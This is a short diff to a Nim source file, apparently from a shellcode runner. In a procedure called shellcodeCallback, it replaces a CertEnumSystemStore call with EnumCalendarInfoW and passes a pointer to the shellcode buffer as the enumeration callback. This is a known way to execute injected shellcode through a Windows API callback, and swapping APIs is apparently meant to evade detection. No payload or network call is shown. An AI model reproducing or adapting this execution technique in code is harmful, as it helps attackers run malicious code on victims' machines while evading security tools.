@@ -78,11 +78,11 @@ proc shellcodeCallback(shellcode: openarray[byte]): void =
         cast[SIZE_T](shellcode.len),
     )
 
-    CertEnumSystemStore(
-        CERT_SYSTEM_STORE_CURRENT_USER,
-        NULL,
-        NULL,
-        cast[PFN_CERT_ENUM_SYSTEM_STORE](rPtr),
+    EnumCalendarInfoW(
+        cast[CALINFO_ENUMPROCW](rPtr),
+        LOCALE_SYSTEM_DEFAULT,
+        ENUM_ALL_CALENDARS,
+        CAL_SMONTHDAY
     )
 
 when isMainModule:
